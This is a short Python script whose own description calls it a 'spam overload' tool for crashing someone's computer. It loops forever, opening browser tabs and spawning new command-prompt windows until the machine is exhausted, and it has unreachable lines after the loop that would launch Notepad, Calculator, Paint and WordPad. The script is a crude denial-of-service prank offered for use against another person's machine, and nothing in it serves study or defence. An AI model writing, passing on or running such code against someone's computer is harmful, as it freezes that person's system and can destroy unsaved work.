import webbrowser
import time
import os
import subprocess

__author__ = "F9"
__github__ = "https://github.com/F9presents"
__date__ = "2025-5-15"
__version__ = "1.0.0"
__description__ = "this is a spam overload  script for testing if u wanna crash someone's computer"

print ("Opening URL in web browser...")
while True:
    print ("open webbrowser")
    webbrowser.open("https://www.google.com")

    print ("Opening URL in spam cmd...")
    # Open a new command prompt window and run the command
    subprocess.Popen(['cmd', '/c', 'start', 'cmd', '/k', 'echo Hello World!'])


print ("Opening URL in spam notepad...")
# Open a new notepad window and run the command
subprocess.Popen(['notepad.exe'])


print ("Opening URL in spam calc...")
# Open a new calculator window and run the command
subprocess.Popen(['calc.exe'])

print ("Opening URL in spam paint...")
# Open a new paint window and run the command
subprocess.Popen(['mspaint.exe'])

print ("Opening URL in spam wordpad...")
# Open a new wordpad window and run the command
subprocess.Popen(['write.exe'])


